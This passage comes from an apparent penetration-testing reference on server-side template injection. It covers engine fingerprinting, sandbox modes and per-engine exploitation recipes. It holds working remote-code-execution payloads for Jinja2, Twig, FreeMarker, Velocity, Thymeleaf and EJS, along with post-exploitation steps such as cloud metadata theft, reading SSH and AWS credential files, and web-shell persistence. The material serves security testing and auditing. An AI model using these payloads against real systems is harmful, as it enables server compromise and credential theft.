- Environment dump (`env`, `os.environ`, `System.getenv`) — credentials, cloud metadata tokens, internal URLs
- Cloud metadata fetch (`http://169.254.169.254/latest/meta-data/`, `http://metadata.google.internal/`) — IAM tokens
- Read filesystem secrets (`.env`, `.aws/credentials`, `~/.ssh/`, `/proc/self/environ`)
- Lateral via internal HTTP — service mesh endpoints reachable from the rendering host
- Persistence: cron, scheduled task, systemd unit, `~/.ssh/authorized_keys`, web shell in webroot

## Testing Methodology

1. **Find templated input** — anywhere a server clearly templated user input (preview panes, email previews, dynamic dashboards, custom fields)
2. **Fingerprint the engine** — run the differential probe table; confirm with a second probe
3. **Confirm evaluation, not reflection** — `{{7*7}}` rendering as `49` (not `{{7*7}}` literally) is the line between XSS and SSTI
4. **Probe sandbox state** — try `{{self}}`, `{{config}}`, `{{request}}`, `{{cycler}}` (Jinja); `${self}`, `${T(java.lang.Class)}` (Java); `<%= self %>` (Ruby) — reachable globals are the gadget pool
5. **Enumerate gadgets** — class walk for Python / Node, reflection for Java, `require` chain for Node
6. **Reach RCE** — pick the shortest gadget chain to a shell-equivalent primitive
7. **Validate side effects** — DNS callback, file write, sleep — anything observable that proves execution

## Validation

1. Show evaluated output for two distinct expressions (`{{7*7}}` → `49` and `{{7*8}}` → `56`) to rule out coincidence or hard-coded reflection
2. Demonstrate object access (`{{self.__class__}}`, `${T(java.lang.Class)}`) confirming runtime reflection
3. Demonstrate side effect — DNS lookup to attacker-controlled domain, sleep with measurable delta, file written to a known path
4. For RCE: command output captured in response, file written, or OAST callback containing command output
5. Provide minimal payload — the simplest expression that reaches RCE, not the kitchen-sink polyglot

## Sandbox Comparison — Cross-Engine Differential

The `Environment` vs `SandboxedEnvironment` framing generalizes:

| Engine | Default mode | Sandbox mode | Sandbox opt-in mechanism | 2024–2026 sandbox-bypass CVE |
|--------|--------------|--------------|--------------------------|-------------------------------|
| Jinja2 (Python) | `Environment` (unsafe) | `SandboxedEnvironment` | Instantiate `SandboxedEnvironment` explicitly | CVE-2025-27516 (`\|attr` filter) — see `ssti_novel_deep.md` |
| Twig (PHP) | Default (unsafe) | Sandbox extension with `SecurityPolicy` | `$env->addExtension(new SandboxExtension($policy))` | CVE-2024-45411 (three-condition bypass) — see `ssti_novel_deep.md` |
| Twig (Symfony) | Default | Sandbox extension | Same | CVE-2026-46636 (Symfony-specific) — see `ssti_novel_deep.md` |
| FreeMarker (Java) | `UNRESTRICTED_RESOLVER` (unsafe) | `ALLOWS_NOTHING_RESOLVER` / `SAFER_RESOLVER` | `Configuration.setNewBuiltinClassResolver(...)` | Post-2.3.30 `?api` restriction |
| Velocity (Java) | Default `UberspectImpl` (unsafe) | `SecureUberspector` | `runtime.introspector.uberspect` config | Ongoing per-version audits |
| Smarty (PHP) | Default (partial) | `SmartySecurity` | `$smarty->enableSecurity(new SmartySecurity($smarty))` | 2024/2026 cluster — see `ssti_novel_deep.md` |
| Mako (Python) | No sandbox | N/A (compiles to Python) | Not sandboxable | N/A |
| ERB (Ruby) | No sandbox (Ruby 3+) | Historical `safe_level` deprecated | N/A on modern Ruby | N/A |
| Handlebars (JS) | Restricted-by-default | Additional `noEscape`/helper restrictions | Configuration-level | March 2026 wave — see `ssti_novel_deep.md` |
| Liquid (Shopify) | Safe-by-design | (default is the sandbox) | N/A | N/A |
| Scriban (.NET) | Safe-by-default | Host chooses what members are exposed | `TemplateContext` member access options | N/A |
| Go `html/template` | Auto-escape by context | (default is the sandbox) | N/A | N/A |
| Go `text/template` | No auto-escape (docs say "arbitrary code execution") | N/A | Do not use on untrusted input | N/A |
| Razor (.NET) | Compiles to C# | Not sandboxable | N/A | N/A |

The class-abstraction takeaway: engines split into three tiers.
1. **Safe-by-design** (Liquid, Scriban, Go html/template) — the sandbox is the default; escaping requires deliberate opt-out.
2. **Safe-by-configuration** (Jinja2, Twig, FreeMarker, Velocity, Smarty) — the sandbox is an opt-in feature; the default is unsafe.
3. **Not sandboxable** (Mako, ERB, Razor, Go text/template) — no sandbox exists; treat any user-controlled template as arbitrary host-language code.

An audit against a tier-2 engine checks whether the sandbox is on. An audit against a tier-3 engine checks whether user input reaches the template source at all (any positive is a finding).

## False Positives

- Template syntax reflected literally (`{{7*7}}` rendered as `{{7*7}}`) — that's XSS-shaped, not SSTI
- Sandboxed environments where reflection succeeds but reachable objects expose nothing useful (Jinja `SandboxedEnvironment` with no `request` / `config` in context)
- Client-side template engines (Vue, Angular, Mustache running in the browser) — that's client-side template injection, different impact (XSS, not RCE)
- Markdown / static-site generators that template at build time only, with no user input reaching the build
- Engines where the output is HTML-escaped before display, masking evaluation as XSS-like reflection — verify with a non-HTML probe (`{{7*7}}` numeric)

## Impact

- Remote code execution on the rendering host (the default outcome — almost every engine leaks a path to it)
- Server-side data exfiltration via gadget chains (filesystem, env vars, internal HTTP)
- Cloud credential theft via metadata service access from the compromised host
- Lateral movement into internal services reachable from the renderer
- Persistent backdoor via web shell or service-account key planting
- Build / supply-chain compromise when the templated content is a build artifact

## Pro Tips

1. Always confirm with a second math probe (`{{7*8}}`) before celebrating — single-shot reflection of `49` could be coincidental
2. Engine fingerprint first, gadget chain second — wrong-engine payloads are wasted requests and noise in WAF logs
3. For Jinja, the highest-yield reachable global varies by framework (`request` in Flask, `config` always present, `cycler` in older Jinja); spray all three before walking subclasses
4. SpEL is everywhere in Spring stacks — Thymeleaf, Spring Security expression language, Spring Cloud Gateway routes; the same payload shape (`${T(java.lang.Runtime)...}`) works across all of them
5. EJS / Nunjucks are common in Express / Koa apps — `require('child_process').execSync('id')` if `require` is in scope (EJS), or escape via `range.constructor("return require('child_process')...")()` for Nunjucks; `process.mainModule.require(...)` is the older form, deprecated since Node 14
6. Sandbox escapes are usually one indirection away — `attr` lookup, constructor traversal, MRO walk; most "sandboxed" environments still reach the runtime if you go through attribute access instead of direct reference
7. Output not reflected? Time-based and OAST work as well as for SQLi — `${T(java.lang.Thread).sleep(5000)}` for SpEL, `{{cycler.__init__.__globals__.__import__('time').sleep(5)}}` (or the `request.application.__globals__.__builtins__` walk in Flask) for Jinja — bare `__import__` is not in the template namespace and will raise `UndefinedError`
8. Email previews and PDF generators are gold mines — they're often built on the same engine as the public site but exposed to less-validated input flows

## Engine Fingerprinting Cheat Sheet

Version and mode identification for the top engines — check these before selecting a payload:

**Jinja2 (Python)**:
- Version: `import jinja2; jinja2.__version__` (source) or reflect via `{{ range.__class__.__module__ }}` (returns `builtins` and doesn't leak version, but a stack trace on a syntax error usually does).
- Sandbox mode: attempt to access `{{ ''.__class__ }}` — succeeds on `Environment`, fails on `SandboxedEnvironment` unless a specific bypass applies.
- Framework wrapper: Flask exposes `{{ config }}`, `{{ request }}`, `{{ g }}`. Django exposes `{{ csrf_token }}`, `{{ user }}`.

**Twig (PHP)**:
- Version: error stack traces usually leak. Otherwise: `{{ _twig_version }}` in some old versions.
- Sandbox mode: attempt `{{ _self.env }}` — succeeds when unsandboxed. Modern Twig 2/3 makes `_self` return the template name (a string), signaling sandbox-adjacent hardening.
- Framework wrapper: Symfony wraps Twig with `template_from_string` enabled by default.

**FreeMarker (Java)**:
- Version: error pages usually leak. `${.now}` renders the current timestamp in a version-dependent format.
- Resolver mode: attempt `<#assign x="freemarker.template.utility.Execute"?new()>` — succeeds on `UNRESTRICTED_RESOLVER`, fails on `SAFER_RESOLVER` / `ALLOWS_NOTHING_RESOLVER`.
- `?api` builtin state: attempt `${myVar?api.class.name}` on a benign variable.

**Velocity (Java)**:
- Version: `${velocityCount}` and other pre-defined variables sometimes leak in errors.
- Uberspector mode: attempt reflection via `$class.inspect("java.lang.Runtime")` — succeeds on default UberspectImpl, fails on SecureUberspector.

**Thymeleaf (Java)**:
- Version: error stack traces.
- Template mode: check the response content-type; HTML mode is the default for `.html` templates, TEXT mode is common for `.txt` email templates.

**Handlebars (JS)**:
- Version: `Handlebars.VERSION` if accessible via reflection.
- Compile-vs-precompile: the CLI precompiler has its own attack surface (see novel deep sibling for the specific advisory); check whether the build pipeline compiles at server-render time or precompiles at build time.

## Testing Recipes Per Engine

Concrete confirm-then-exploit sequences per engine:

**Jinja2 (unsandboxed)**:
```
1. Fingerprint: {{7*7}} → 49
2. Enumerate globals: {{ config }} / {{ request }} / {{ cycler }}
3. Reflection: {{ ''.__class__.__mro__[1].__subclasses__() }} — grep response for 'Popen' / '_wrap_close'
4. Exec: {{ ''.__class__.__mro__[1].__subclasses__()[N](['id'], stdout=-1).communicate()[0].decode() }}
5. Rebuttal: submit to a sandboxed instance and confirm ConstructorError / SandboxError
```

**Twig (unsandboxed)**:
```
1. Fingerprint: {{7*7}} → 49
2. Check _self: {{ _self }} — object dump on 1.x, template name string on 2.x/3.x
3. Reflection (1.x): {{ _self.env.registerUndefinedFilterCallback("system") }}{{ _self.env.getFilter("id") }}
4. Reflection (2.x/3.x): version-specific payload; try _context.env if available
5. Rebuttal: submit to a sandbox-extension instance and confirm SecurityError
```

**FreeMarker (UNRESTRICTED_RESOLVER)**:
```
1. Fingerprint: ${7*7} → 49
2. Class access: ${"".class.name} — should render java.lang.String
3. Exec: <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
4. Rebuttal: submit to a SAFER_RESOLVER instance and confirm TemplateException
```

**Velocity (default)**:
```
1. Fingerprint: ${7*7} → 49
2. Class access: $class.inspect("java.lang.String").type — should render java.lang.String
3. Exec via reflection: #set($r = $class.inspect("java.lang.Runtime").type.getMethod("getRuntime").invoke(null))$r.exec("id")
4. Rebuttal: submit to a SecureUberspector instance
```

**Thymeleaf (attacker controls template source)**:
```
1. Fingerprint: ${7*7} → 49
2. SpEL access: ${T(java.lang.Class)} — should render java.lang.Class
3. Exec: <div th:utext="${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).useDelimiter('\\A').next()}"></div>
4. Rebuttal: attempt against normal model binding (no template-source control) and confirm SSTI does not fire
```

**EJS**:
```
1. Fingerprint: <%= 7*7 %> → 49
2. Direct exec: <%= require('child_process').execSync('id').toString() %>
3. Rebuttal: patched-version instance (post-3.1.7 for the outputFunctionName class)
```

## Tooling

- **tplmap** — semi-automated SSTI scanner covering multiple engines. Point at a fuzzable position; the tool fingerprints and attempts RCE via the appropriate gadget. Useful for initial triage; hand-audit for confirmation.
- **SSTImap** — a modern fork of tplmap with wider engine coverage and updated gadget chains.
- **interactsh-client** — OAST callback for blind confirmation. Mint a unique host per test run.
- **agent-browser** — capture the rendered output when the target routes through a headless-browser render (some PDF generators, some email preview endpoints).
- **fickling** (adjacent) — for the SSTI-to-pickle chain when a template reaches a pickle deserialization sink.
- **Burp Suite Intruder + custom payloads** — for iterating engine-fingerprint probes against many endpoints.

Sandbox for local mock-target testing: build a small Flask app with `Environment` vs `SandboxedEnvironment` to reproduce the exact class-shape you're testing against; iterate the payload locally before firing at the real target.

```bash
# Rapid engine-fingerprint sweep with curl
for probe in '{{7*7}}' '{{7*"7"}}' '${7*7}' '<%= 7*7 %>' '#{7*7}' '{{= 7*7 }}'; do
  result=$(curl -s "https://target/render?input=$probe")
  echo "$probe: $(echo "$result" | grep -oE '(49|7777777|7\*7)' | head -1)"
done
```

## Summary

SSTI is fundamentally different from XSS at the same syntactic location: the payload runs on the server, in the host language, with whatever objects the engine exposes. Engine fingerprinting via the math-probe table narrows the search space immediately. From there it's a race between the sandbox's denylist and the language's reflection capability — and the language usually wins. Treat any user input that reaches a template renderer (not a templated context variable) as RCE-shaped until proven sandboxed. The canonical framing — `Environment` vs `SandboxedEnvironment` in Jinja2, generalized across every template engine's sandbox-mode differential — is the load-bearing analytical move: audit the mode, not the engine. The trio's three-file split: this base owns the technique-class primitive tour, engine fingerprinting, the confirmation-without-RCE ladder, the SSTI+LLM crossover class introduction, the CI/CD expression-injection class shape, framework-layer SSTI, and chaining; `ssti_advanced_deep.md` owns per-engine sandbox-escape depth (Jinja SandboxedEnvironment source dissection, FreeMarker TemplateClassResolver, Velocity SecureUberspector, Twig SecurityPolicy), TEFuzz-and-successor detection frontier, and CSTI crossover; `ssti_novel_deep.md` owns the 2024–2026 canonical CVE version/fix tables (Jinja2 CVE-2025-27516, Twig CVE-2024-45411 and CVE-2026-46636 Symfony sandbox, Grav CVE-2024-28118/28119/CVE-2025-66294 cluster, banks/Haystack/spacy-llm SSTI+LLM cluster, Handlebars March 2026 wave, CI/CD Argo CVE-2026-31892 cluster) with GHSA IDs single-owner.
